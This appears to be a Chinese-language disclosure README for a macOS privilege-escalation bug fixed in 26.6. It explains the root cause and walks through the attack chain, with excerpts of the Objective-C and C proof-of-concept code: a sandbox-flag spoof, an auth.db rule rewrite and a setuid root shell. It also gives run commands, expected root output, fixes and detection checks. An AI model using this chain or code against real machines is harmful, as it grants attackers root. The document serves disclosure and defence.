# macOS_DSH_LPE — DesktopServicesHelper chown primitive + auth.db hijack

> **macOS 本地权限提升 (LPE) | 高危 | 无 CVE（Apple 拒绝分配）** | [复现方法](#复现步骤)
>
> 非特权用户（uid501）约 2 秒拿到 root，无用户交互、无 GUI 弹窗、无需重启、无需内核漏洞。两条各自"正确"的系统组件被串起来，就成了 LPE。

---

## 漏洞速览

| 项目 | 内容 |
|------|------|
| **CVE 编号** | 无（Apple Product Security 确认底层 bug 已在 26.6 beta 修复，但拒绝分配 CVE、拒绝署名） |
| **漏洞代号** | macOS_DSH_LPE（DesktopServicesHelper + auth.db 劫持） |
| **漏洞类型** | 本地权限提升 (LPE) —— 逻辑 / 组合型信任假设缺陷 |
| **CVSS** | 未分配（仓库自评：**High** — 非特权用户 → root，无用户交互） |
| **CWE** | 未分配（组合缺陷：XPC 信任假设 + 配置实时读取未校验属主） |
| **发现方** | Lyutoon（由其自主 Agent 于 2026-07-18 端到端发现并验证） |
| **报告日期** | 2026-07-18 报告 Apple Product Security |
| **修复版本** | macOS 26.6（26.6 公告仅列出一项 DSH 相关 Gatekeeper 绕过，本 LPE 未被单独枚举） |
| **受影响版本** | macOS < 26.6（实测 26.5.2 / build 25F84，arm64，SIP 开启） |
| **漏洞官网** | https://github.com/Lyutoon/macOS_DSH_LPE |
| **利用条件** | 本地非特权用户（uid501 admin）+ SIP 开启 + Xcode CLI 工具（clang）+ sqlite3 |

---

## 受影响范围

### 系统版本

```
macOS  <  26.6          # 全部受影响
实测:   26.5.2 (25F84)  # arm64, SIP on, 验证可用
修复:   26.6            # 修复已随 26.6 发布
```

### 关键组件（均随系统默认安装）

| 组件 | 路径 / 服务 | 角色 |
|------|------------|------|
| `DesktopServicesHelper` (DSH) | `/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/Resources/DesktopServicesHelper`，XPC 服务 `com.apple.DesktopServicesHelper` | 提供危险的 `RepairPermissionsForCloudItems` chown 原语 |
| `securityd` | `/usr/sbin/securityd` | 实时读取 `/private/var/db/auth.db` 作为授权裁决依据 |
| `security_authtrampoline` | `/usr/libexec/security_authtrampoline` | 以 root 身份执行 `AuthorizationExecuteWithPrivileges` 请求 |

### 测试环境（PoC 开发机）

| 项目 | 配置 |
|------|------|
| 机型 | MacBook Air (15-inch, 2023) — `Mac14,15` |
| 芯片 | Apple M2 · 24 GB |
| 架构 | arm64 (Apple Silicon) |
| 系统 | macOS 26.5.2 |
| SIP | 开启 |

> **注意**：Apple 的 26.6 安全公告只列出了一条 "DSH-related Gatekeeper bypass"，本 LPE 未被单独枚举、也未分配 CVE。26.6 已包含修复，但公开记录里这一条 LPE 是"无编号"状态——本仓库为其留存公开记录。

---

## 根因分析

漏洞由两个原生系统组件交汇形成，单独看每个组件都没问题，组合在一起就成了 LPE。

### 组件一：`DesktopServicesHelper` 的任意 chown 原语

- **二进制**：`/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/Resources/DesktopServicesHelper`
- **XPC 服务**：`com.apple.DesktopServicesHelper`
- **处理器**：`sub_100022574` @ `0x100022574` —— `RepairPermissionsForCloudItems` 请求处理器
- **行为**：对调用方传入的每一个路径，执行 `open(path, O_SYMLINK)` 然后 `fchown(fd, caller_euid, original_gid)`。这个处理器本意是修复 iCloud Drive 项目的属主，但对传入路径**没有任何 iCloud Drive 容器路径校验**，也**没有任何 entitlement 网关**。
- **效果**：系统上任何非 SIP 保护的 root 属主文件，都能被非特权进程 chown 到调用者 uid。

**绕过 dispatcher 网关（`sub_1000322D0`）：**

处理器唯一的防护就是 dispatcher 网关，它只检查 `sandbox_check_by_audit_token == true`，并把"结果为真"解读为"调用方是 Apple 加持的沙箱 App"。这个假设**可被伪造**：任何非特权进程都能调用

```c
sandbox_init(kSBXProfileNoInternet, SANDBX_NAMED, &err);
```

来设置网关所依赖的 audit-token 沙箱标志。标志一设置，请求就被分发到 `sub_100022574`，随后它会 chown 任意调用方传入的路径。

### 组件二：`securityd` 实时信任 auth.db 属主

- `securityd` 在**每一次** `AuthorizationCopyRights` 调用时都会读取 `/private/var/db/auth.db`，并把该数据库当作权威裁决依据。
- 它**假设** `auth.db` 只有 root 可写，在打开文件时**没有重新断言 `st_uid == 0`**（也没校验 mode 合理性）。
- 因此，任何能把 `auth.db`（及其 SQLite 侧车文件 `-wal` / `-shm`）chown 给攻击者的机制，都能彻底击穿授权框架：攻击者可以改写任意授权规则，包括 `system.privilege.admin`。

### 为什么难以发现

- `sub_100022574` 的 chown 原语原本是为 iCloud 修复设计的，设计上"合规"，从没人把它当作 `auth.db` 的攻击面来审视。
- `securityd` 的实时读取设计也是"合规"的——它信任文件属主。
- 两个组件**各自正确**，但 `securityd` 的实时读取设计落地时，从没考虑过"chown 原语会把 auth.db 拱手送给攻击者"这一组合情形。

---

## 利用机制

### 完整攻击链路

```
非特权用户(uid501)
  → sandbox_init(kSBXProfileNoInternet)         # 1. 设置 audit-token 沙箱标志，骗过 DSH dispatcher 网关
  → RepairPermissionsForCloudItems(auth.db,     # 2. DSH 把三个文件从 root chown 给调用者
       auth.db-wal, auth.db-shm)
  → sqlite3 auth.db "UPDATE rules               # 3. securityd 实时读到 class=allow，无需重启
       SET class=4 WHERE name='system.privilege.admin'"
  → AuthorizationExecuteWithPrivileges(          # 4. launchd 拉起 security_authtrampoline(root)
       "/bin/sh", ["-c", "<payload>"])              #    posix_spawn payload 为 euid=0，无 GUI 弹窗
  → chown root:wheel /tmp/future_rootshell       # 5. 落地一个 setuid-root shell
       && chmod 4755 /tmp/future_rootshell
  → /tmp/future_rootshell -c 'id'               # 6. uid=0(root) gid=0(wheel)
```

| 步骤 | 动作 | 结果 |
|------|------|------|
| 1 | `sandbox_init(kSBXProfileNoInternet)` | audit-token 沙箱标志置位 → DSH dispatcher 网关通过 |
| 2 | 发送 `RepairPermissionsForCloudItems`，路径为 `auth.db` / `auth.db-wal` / `auth.db-shm` | DSH 把三个文件从 root → 调用者 |
| 3 | `sqlite3 auth.db "UPDATE rules SET class=4 WHERE name='system.privilege.admin'"`（`class=1`/user → `class=4`/allow） | `securityd` 实时把该规则当作 allow 返回（无需重启） |
| 4 | `AuthorizationExecuteWithPrivileges("/bin/sh", ["-c", "<payload>"])` | launchd 拉起 `security_authtrampoline`（root）→ `posix_spawn` payload 为 **euid=0**，**无 GUI 弹窗** |
| 5 | Payload：`chown root:wheel /tmp/future_rootshell && chmod 4755 /tmp/future_rootshell` | 安装一个 setuid-root shell |
| 6 | `/tmp/future_rootshell -c 'id'` | `uid=0(root) gid=0(wheel)` |

### 为什么 100% 可靠

| 特性 | 说明 |
|------|------|
| 无 GUI 弹窗 | `AuthorizationExecuteWithPrivileges` 在 Sonoma/Sequoia/26.x 上仍可用，`authtrampoline` 无交互执行 |
| 无重启 | `securityd` 实时读取 auth.db，改库即生效 |
| 无内核漏洞 | 纯用户态逻辑 / 组合缺陷，不涉及内核 |
| 无 SIP 绕过 | 攻击面都在非 SIP 保护范围内 |
| 无 TCC 弹窗 | 链路不触碰 TCC 受保护资源 |

---

## PoC 分析 (`exploit/lpe.sh`)

`lpe.sh` 是**自包含**的 exploit：它在运行时内联编译三个小程序，然后跑完整链路。无需外部文件、无需内核代码、无需修改任何二进制。

三个内联编译的程序：

| 程序 | 语言 | 作用 |
|------|------|------|
| `dsh_chown` | Objective-C (`dsh_chown.m`) | DSH XPC 客户端，执行 chown 原语 |
| `install_rootshell` | C (`install_rootshell.c`) | `AuthorizationExecuteWithPrivileges` 客户端 |
| `future_rootshell` | C (`future_rootshell.c`) | setuid-root shell payload（编译为 uid501；由 AEWP 把它 chown 成 root + setuid） |

**关键片段 1：DSH chown 客户端（绕过网关 + 发起 RepairPermissionsForCloudItems）**

```objc
// dsh_chown.m (节选)
char *err = NULL;
if (sandbox_init(kSBXProfileNoInternet, SANDBX_NAMED, &err) != 0) {   // 伪造沙箱标志
    fprintf(stderr, "[!] sandbox_init failed: %s\n", err ? err : "(null)");
    return 3;
}
xpc_connection_t c = xpc_connection_create_mach_service(
    "com.apple.DesktopServicesHelper", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
// ...
NSArray *paths = @[ [NSString stringWithUTF8String:argv[i]] ];
NSData *archived = [NSKeyedArchiver archivedDataWithRootObject:paths
                                          requiringSecureCoding:YES error:nil];
xpc_object_t req = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(req, "request", "RepairPermissionsForCloudItems");
xpc_dictionary_set_data(req, "Paths", archived.bytes, archived.length);
xpc_connection_send_message_with_reply_sync(c, req);                 // 触发 chown
```

**关键片段 2：AEWP 客户端（驱动 authtrampoline 落地 setuid shell）**

```c
// install_rootshell.c (节选)
AuthorizationItem right = { "system.privilege.admin", 0, NULL, 0 };
AuthorizationRights rights = { 1, &right };
err = AuthorizationCopyRights(auth, &rights, NULL,
        kAuthorizationFlagDefaults | kAuthorizationFlagExtendRights, NULL);   // 此时规则已是 allow
char *args[] = { "-c", argv[1], NULL };
err = AuthorizationExecuteWithPrivileges(auth, "/bin/sh",
        kAuthorizationFlagDefaults, args, &pipe);                              // 以 root 执行
```

**关键片段 3：setuid root shell payload**

```c
// future_rootshell.c (节选)
int main(int argc, char **argv) {
    setuid(0); setgid(0);
    if (argc > 2 && strcmp(argv[1], "-c") == 0) return system(argv[2]);
    char *args[] = {"/bin/sh", "-p", NULL};
    execv("/bin/sh", args);
    return 127;
}
```

脚本主流程（STEP 2–4）依次：① 用 `dsh_chown` 把 `auth.db` 三件套 chown 给当前用户；② `sqlite3` 把 `system.privilege.admin` 的 `class` 由 `1`(user) 改成 `4`(allow)，并用 `security authorizationdb read` 验证 `securityd` 已实时生效；③ 用 `install_rootshell` 经 AEWP 把 `future_rootshell` 改成 root:wheel + 4755；④ 验证 `/tmp/future_rootshell -c 'id'` 返回 `uid=0(root)` 后，丢出一个交互式 root shell。

---

## 复现步骤

### 环境要求

- 受影响版本 macOS（实测 26.5.2 / build 25F84，arm64，SIP 开启）
- 本地非特权用户（uid501 admin）
- Xcode 命令行工具（提供 `clang`）
- `sqlite3`

### 方法 1：官方 PoC（本仓库已下载）

```bash
# 进入本漏洞目录
cd macOS_DSH_LPE/exploit

# 用一个非特权(非 root)用户运行 —— 这是 LPE 的入口
./lpe.sh            # 弹出一个交互式 root shell（会留下 setuid rootshell + 被改的 auth.db）

# 还原系统：恢复 auth.db 规则 + 属主，并删除 rootshell
./lpe.sh cleanup
```

### 方法 2：上游仓库

```bash
git clone https://github.com/Lyutoon/macOS_DSH_LPE.git
cd macOS_DSH_LPE
./lpe.sh
./lpe.sh cleanup
```

### 预期效果

```
$ id
uid=501(test) gid=20(staff) ...
$ ./lpe.sh
[*] Starting uid:
uid=501(test) gid=20(staff) ...
[+] All 3 PoC binaries built
[*] STEP 1: chown auth.db{,-wal,-shm} via DesktopServicesHelper primitive
[+] auth.db now owned by test
[+] securityd serving rule as class=allow (no restart needed)
[+] /tmp/future_rootshell is now setuid root:wheel
uid=0(root) gid=0(wheel)
root
```

> **重要**：默认模式会**故意保留** setuid rootshell 和修改后的 auth.db。跑完务必执行 `./lpe.sh cleanup` 还原系统。仅在你拥有或被明确授权测试的机器上运行。

---

## 修复方案

### 官方修复

- **macOS 26.6** 已包含底层修复（Apple 称该 bug 在 2026 年 6 月中旬的 26.6 beta 中已被修复）。升级到 26.6 即可。

### 上游提交给 Apple 的修复建议（`exploit/apple-report.md`）

1. **`sub_100022574` / DesktopServicesHelper**：要求调用方传入的路径必须位于 audit-token 解析出的用户 iCloud Drive 容器内（`~/Library/Mobile Documents/`），其余一律拒绝；同时用真正的"Apple 加持沙箱"校验（签名身份或私有 entitlement）替换 dispatcher 里的 `sandbox_check_by_audit_token`，因为 `sandbox_init` 让后者可被伪造。
2. **`securityd`**：每次打开 auth.db 时重新断言属主（`fchown(fd, 0, 0)`；遇 `EPERM` 失败即关闭），并在 `st_uid != 0` 或 `st_mode & 022` 时拒绝。
3. **`authtrampoline`**：当 `system.privilege.admin` 解析结果为 `class=allow` 时拒绝执行（AEWP 已 deprecated，显式要求 user-class 规则可进一步加固）。

### 临时缓解（无官方补丁时的兜底）

- 升级到 macOS 26.6（根本修复）。
- 在 26.6 之前：由于链路依赖 `auth.db` 实时读取 + DSH chown 原语，普通用户无法在不升级的情况下彻底封堵；可考虑限制非特权用户对 `DesktopServicesHelper` 的非预期访问（需系统级配置，超出用户态可控范围）。
- 监控 `auth.db` 属主变化：`stat -f '%Su:%Sg' /private/var/db/auth.db` 应恒为 `root:wheel`；`security authorizationdb read system.privilege.admin` 的 `class` 应为 `user`（非 `allow`）。

---

## 检测排查

| 检查项 | 命令 | 正常预期 | 异常（疑似被利用） |
|--------|------|----------|---------------------|
| auth.db 属主 | `stat -f '%Su:%Sg' /private/var/db/auth.db` | `root:wheel` | 属主变成普通用户 |
| 管理员规则 class | `security authorizationdb read system.privilege.admin \| grep -A1 '<key>class'` | `<string>user</string>` | `<string>allow</string>` |
| 残留 setuid shell | `ls -l /tmp/future_rootshell` | 文件不存在 | 存在且 `-rwsr-xr-x root:wheel` |
| 工作目录残留 | `ls -ld /tmp/lpe_work` | 不存在 | 存在 |

> 若发现上述异常，立即删除 `/tmp/future_rootshell`、将 `auth.db` 三件套恢复 `root:wheel` 且 `chmod 600`，并把 `system.privilege.admin` 的 `class` 改回 `user`，最后重启 `securityd`（或重启）。

---

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-06 中旬 | Apple 在 macOS 26.6 beta 中修复底层 bug（发现方报告时 Apple 已确认） |
| 2026-07-18 | 由 Lyutoon 的自主 Agent 端到端发现并验证；同日完整链路 + 自包含 PoC 报告给 Apple Product Security |
| 2026（26.6 发布） | 修复随 26.6 发布；但 26.6 公告仅列出一项 DSH 相关 Gatekeeper 绕过，本 LPE 未被单独枚举，**Apple 拒绝分配 CVE、拒绝署名** |
| 2026（公开） | 仓库 https://github.com/Lyutoon/macOS_DSH_LPE 公开留存记录 |

---

## 参考资料

| 来源 | 链接 |
|------|------|
| GitHub 官方 PoC 仓库 | https://github.com/Lyutoon/macOS_DSH_LPE |
| 原报告（提交给 Apple Product Security） | 见本目录 `exploit/apple-report.md`（亦 upstream `apple-report.md`） |
| Demo 录屏（uid501 → root，约 2 秒无弹窗） | 本目录 `exploit/lpe.mov`（亦 upstream `lpe.mov`） |
| HackTricks — macOS Privilege Escalation | https://book.hacktricks.wiki/zh/macos-hardening/macos-security-and-privilege-escalation/macos-privilege-escalation.html |

- 发现方：Lyutoon（自主 Agent 发现）
- 报告时间：2026-07-18
- 以上链接最后访问时间：2026-08-05

---

## 免责声明

本仓库内容仅供**安全研究与授权测试**用途。

- 请勿对不属于你、或未经明确授权测试的任意系统运行这些 PoC。
- 作者不对任何滥用行为承担法律责任。
- 始终遵循负责任的披露实践。
- 本漏洞已在 macOS 26.6 中修复；请勿在未授权设备上测试。
